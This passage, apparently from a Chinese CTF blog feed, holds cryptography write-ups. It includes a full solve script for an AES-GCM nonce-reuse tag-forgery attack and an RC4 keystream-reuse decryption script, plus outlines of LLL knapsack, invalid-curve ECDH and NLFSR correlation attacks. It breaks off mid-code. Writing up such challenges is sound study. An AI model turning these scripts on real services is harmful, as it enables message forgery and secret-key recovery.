有了以上的知识贮备后，接下来就是实战的环节了。在看完The Forbidden Attack的描述，我们知道为了达成伪造签名的目标，我们必须使得加密所使用的nonce相同并获取其加密结果。但在UnSafeAES这道题中中，似乎nonce无法被我们直接控制，而且加密前会检查该nonce是否已经使用过，因此如何让服务端使用相同的nonce进行加密不那么容易。</p><p>​    首先为了让服务端使用相同的nonce进行加密，我们可以对nonce进行00填充，因为我们注意到服务端在解析我们的输入时，不会检查nonce的长度，因此我们可以传输字符串不同，但是转为数字后相同的nonce。例如<code>nonce1 = &#39;\x00&#39;+ &#39;A&#39;*11</code>, <code>nonce2 = &#39;A&#39;*11</code>，尽管<code>nonce1 != nonce2</code>，但是<code>bytes_to_long(nonce1) == bytes_to_long(nonce2)</code>，因此我们可以通过这种方法来绕过检查。但是我们无法直接发送带00填充的nonce，因为服务端在解析输入后会首先进行解密，其中就包括验证部分，假如验证失败，就会退出。但是细心的朋友肯定已经注意到题目代码中的不寻常之处，在client函数中有以下代码片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(data)</span>:</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">b"ctf.server/test?message="</span> + ct</span><br><span class="line">        nonce = hashlib.sha256(url).digest()[:<span class="number">12</span>]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里把nonce设置为sha256为计算的结果，因此我们控制sha256计算出的结果，使其带有00填充。由于后续我们需要多次加密，因此我控制sha256计算出的结果头部含有三个00填充，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line"><span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line">send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">print</span> m.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终我们可以得到<code>m.encode(&#39;hex&#39;) = &#39;9cd872&#39;</code></p><p>​    这样，当我们<strong>第一次发送数据</strong>时，我们可以发送<code>9cd87241414141414141414141414141414141414141414141414141</code>使得nonce的首三个字节均为<code>&#39;\x00&#39;</code>。然后我们获取到服务器第一次打印出的数据，记为client1，然后为了让程序接下来继续使用我们构造的nonce去加密，我们在<strong>第二次发送数据</strong>时发送将client1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时服务端解析后的nonce尽管和第一次nonce相比少了一个<code>&#39;\x00&#39;</code>，然而实质相同。然后我们获取到服务器打印出的数据，记为server1。在<strong>第三次发送数据</strong>时发送将server1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时的nonce尽管和前两次都不同，但是实质相同。然后再次获取到服务器打印的数据client2。到此我们已经获取到了client1，server1，client2。然后我们需要用client1，client2来计算认证密钥$H$。具体步骤如下：</p><p>​    首先我们获取到client1中的三块加密结果（分别16字节，16字节，4字节）以及client2中的三块加密结果，并将其转为多项式，分别记为$C_{1,1}$，$C_{1,2}$，$C_{1,3}$，$C_{2,1}$，$C_{2,2}$，$C_{2,3}$。注意$C_{1,3}$和$C_{2,3}$需要填充。同时获取到client1和client2中的tag部分，记为$T_1$，$T_2$，并计算$L_1$，$L_2$。同时记相关消息的多项式表达（<code>&quot;from client&quot;</code>）为$A$。然后我们就有：</p><blockquote><p>$g1’(X) = AX^5 + C_{1,1}X^4 + C_{1,2}X^3 + C_{1,3}X^2 + L_1X + S + T1$</p><p>$g2’(X) = AX^5 + C_{2,1}X^4 + C_{2,2}X^3 + C_{2,3}X^2 + L_1X + S + T1$</p><p>$f(X) = g1’(X) + g2’(X) = (C_{1,1}+C_{2,1})X^4 + (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + (L_1+L_2)X + T_1 + T_2$</p></blockquote><p>同时我们知道$C_{1,1} = C_{2,1}$，$L_1 = L_2$。因此可化简为：</p><blockquote><p>$f(X) = (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + T_1 + T_2$</p></blockquote><p>根据$f(H) = 0$，我们可解出所有可能的解。然后篡改解密消息同时伪造签名，发送给服务端。具体过程如下：</p><p>首先利用字节翻转将client2中的消息进行篡改，使得解密后特定位置字符串为<code>&quot;flag&quot;</code>，然后伪造签名。为了伪造签名，我们需要计算出$S$，因为$g(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX + S$（其中$S$未知）。因此为了计算出$S$，我们构造函数$f2(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX +T$, 那么我们就有$f2(H) + S = 0$，因此$S = f2(H)$，之后我们将$S$代入$g(X)$即可计算出相对应的签名。</p><p>​    我们记对client2中密文部分进行字节反转后的结果为c，伪造签名为t，对client2中的nonce部分的首字节删除后（删除<code>&#39;\x00&#39;</code>）的nonce结果为n，那么<strong>最后一次发送数据</strong>时我们将发送c+t+n。于是我们就能得到服务端打印出的对flag进行加密的结果，简单计算后发现len(flag) = 23，小于client1中的密文长度，因此直接对其进行字节翻转得到flag。</p><p>关键脚本部分如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(s)</span>:</span></span><br><span class="line">s = s + (<span class="number">16</span>-len(s))*<span class="string">"\x00"</span></span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line">forge = <span class="string">'ctf.server/flag?message='</span></span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line">m = <span class="string">'9cd872'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line"><span class="keyword">print</span> (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"nonce: "</span>+nonce.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"MITM: "</span>)</span><br><span class="line">p.sendline(send)</span><br><span class="line">client1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c1 = client1[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t1 = client1[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1: "</span>+c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t1: "</span>+t1</span><br><span class="line"></span><br><span class="line">p.sendline(client1+nonce[<span class="number">1</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">server1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">12</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(server1+nonce[<span class="number">2</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">client2 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c2 = client2[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t2 = client2[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2: "</span>+c2</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t2: "</span>+t2</span><br><span class="line"></span><br><span class="line">c1_1 = c1[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_2 = c1[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_3 = padding(c1[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t1 = t1.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">c2_1 = c2[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_2 = c2[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_3 = padding(c2[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t2 = t2.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (c1_2+c2_2) * X^3 + (c1_3+c2_3) * X^2 + t1 + t2 = 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_poly</span><span class="params">(block, a)</span>:</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">bits = bin(bytes_to_long(block))[<span class="number">2</span>:].zfill(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">for</span> e, bit <span class="keyword">in</span> enumerate(bits):</span><br><span class="line">f += int(bit) * a**e</span><br><span class="line"><span class="keyword">return</span> f </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_to_bytes</span><span class="params">(poly)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, bit <span class="keyword">in</span> enumerate(poly._vector_()):</span><br><span class="line">        a |= int(bit) &lt;&lt; (<span class="number">127</span> - i)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(a)</span><br><span class="line"></span><br><span class="line">F, a = GF(<span class="number">2</span>**<span class="number">128</span>, name=<span class="string">"a"</span>).objgen()</span><br><span class="line">R, X = PolynomialRing(F, name=<span class="string">"X"</span>).objgen()</span><br><span class="line"></span><br><span class="line">C1_1 = bytes_to_poly(c1_1, a)</span><br><span class="line">C1_2 = bytes_to_poly(c1_2, a)</span><br><span class="line">C1_3 = bytes_to_poly(c1_3, a)</span><br><span class="line">T1 = bytes_to_poly(t1, a)</span><br><span class="line"></span><br><span class="line">C2_2 = bytes_to_poly(c2_2, a)</span><br><span class="line">C2_3 = bytes_to_poly(c2_3, a)</span><br><span class="line">T2 = bytes_to_poly(t2, a)</span><br><span class="line"></span><br><span class="line">len_aad = <span class="number">11</span></span><br><span class="line">len_txt = <span class="number">36</span></span><br><span class="line">L = long_to_bytes(((<span class="number">8</span> * len_aad) &lt;&lt; <span class="number">64</span>) | (<span class="number">8</span> * len_txt))</span><br><span class="line">L = bytes_to_poly(L, a)</span><br><span class="line">A = bytes_to_poly(padding(<span class="string">"from client"</span>), a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f(x) = 0</span></span><br><span class="line">f = (C1_2+C2_2) * X**<span class="number">3</span> + (C1_3+C2_3) * X**<span class="number">2</span> + T1 + T2</span><br><span class="line"><span class="comment"># f1(X) = S</span></span><br><span class="line">f1 = A * X**<span class="number">5</span> + C1_1 * X**<span class="number">4</span> + C1_2 * X**<span class="number">3</span> + C1_3 * X**<span class="number">2</span> + L * X + T1</span><br><span class="line"></span><br><span class="line">G1 = bytes_to_poly(c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1_1[<span class="number">15</span>:], a)</span><br><span class="line">G2 = C1_2</span><br><span class="line">G3 = C1_3</span><br><span class="line"><span class="comment"># f2(X) + S = forge_tag</span></span><br><span class="line">f2 = A * X**<span class="number">5</span> + G1 * X**<span class="number">4</span> + G2 * X**<span class="number">3</span> + G3 * X**<span class="number">2</span> + L * X</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, _ <span class="keyword">in</span> f.roots():</span><br><span class="line"><span class="comment"># print root</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"H: "</span>+poly_to_bytes(root).encode(<span class="string">'hex'</span>)</span><br><span class="line">S = f1(root)</span><br><span class="line">forge_tag = poly_to_bytes(f2(root) + S)</span><br><span class="line">send = c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1[<span class="number">30</span>:].decode(<span class="string">'hex'</span>) + forge_tag + nonce[<span class="number">3</span>:]</span><br><span class="line">send = send.encode(<span class="string">'hex'</span>)</span><br><span class="line">p.sendline(send)</span><br><span class="line">flag = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag: "</span>+flag</span><br><span class="line">flag = flag[:-(<span class="number">9</span>+<span class="number">16</span>)*<span class="number">2</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">flag = strxor(strxor(flag, c1.decode(<span class="string">'hex'</span>)[:len(flag)]), url[:len(flag)])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>完整代码详见<a href="https://github.com/zrax-x/CTF/blob/master/2020-5space/solve.py" target="_blank" rel="noopener">solve.py</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    尽管nonce重用攻击在以往的比赛中已经出现过，但是在这次比赛中的题目很好的加入了新的元素，在增加题目难度的同时也很好了保证了题目的质量。</p><p>参考链接</p><p><a href="https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden" target="_blank" rel="noopener">https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden</a> </p><p>文章转载自安全客<a href="https://www.anquanke.com/post/id/209203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209203</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒五月赛BJD&amp;DAS</title>
      <link href="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/"/>
      <url>/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/</url>
      
        <content type="html"><![CDATA[<h2 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h2><p>题目本身不难，比赛时没有注意到两次加密的是同一张图片，所以没有做出来。</p><p>做法比较简单，因为两个plaintext长度不等（这里是相差一个字节）。因此通过异或plaintext1和ciphertext1的最后一个字节我们可以得到RC4此时产生key，而两次加密时RC4所产生的密钥流显然是一样的，因此可以用这个key去解出图片的第一个像素点，记为p1。同时我们知道两张图片是相同的，因此通过p1和第一次加密的图片的第一个像素点，我们又可以拿到下一个key，用它来解密第二次加密时的第二个像素点，以此类推，最终解出整张图片。</p><p>赛后简单的写了下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author : zraxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line"></span><br><span class="line">enc1_file = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">enc2_file = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(enc1_file)</span><br><span class="line">img2 = array(enc2_file)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line">ciphertext1 = <span class="number">12078640933356268898100798377710191641</span></span><br><span class="line">m = ord(<span class="string">'g'</span>)</span><br><span class="line">c = int(hex(ciphertext1).strip(<span class="string">'L'</span>)[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            k = (c ^ m)</span><br><span class="line">            c = pixel2[i] <span class="comment"># get ciphertext of img2</span></span><br><span class="line">            pixel2[i] = pixel2[i] ^ k  </span><br><span class="line">            m = pixel2[i] <span class="comment"># get plaintext of img2 and img1</span></span><br><span class="line">            c = pixel1[i] <span class="comment"># get ciphertext of img1</span></span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc = Image.fromarray(img2)</span><br><span class="line">enc.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><h2 id="backpacker"><a href="#backpacker" class="headerlink" title="backpacker"></a>backpacker</h2><p>这是一个利用LLL的攻击，比赛时还没有接触过这类题目，所以没有解出来。之后在网上搜索资料看到相关的攻击方法，记录一下。</p><p><img src="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/1591426710827.png" alt="theory"></p><p>按文中给出的方法构造矩阵，然后求LLL，对其中的行向量（只包含-1或1）进行处理（-1转为0），即得到了我们的明文。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> LLL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-ECDH</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-ECDH/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-ECDH/</url>
      
        <content type="html"><![CDATA[<p>定位到题目源码中最关键的部分——密钥交换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">r = zero</span><br><span class="line">tmp = p</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">        r = add(r,tmp)</span><br><span class="line">    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">key = (x,y)</span><br><span class="line">result = mul(self.secret,key)</span><br><span class="line">self.key = self.pointToKeys(result)</span><br><span class="line">self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure><p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p><p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p><p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> ECDH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF[2020]-NLFSR</title>
      <link href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/"/>
      <url>/2020/05/11/De1CTF%5B2020%5D-NLFSR/</url>
      
        <content type="html"><![CDATA[<p>首先看一下题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p>可以看出这个属于非线性组合生成器 </p><p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p><p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">suma += ao==o</span><br><span class="line">sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">sumc += (co^do)==o</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span 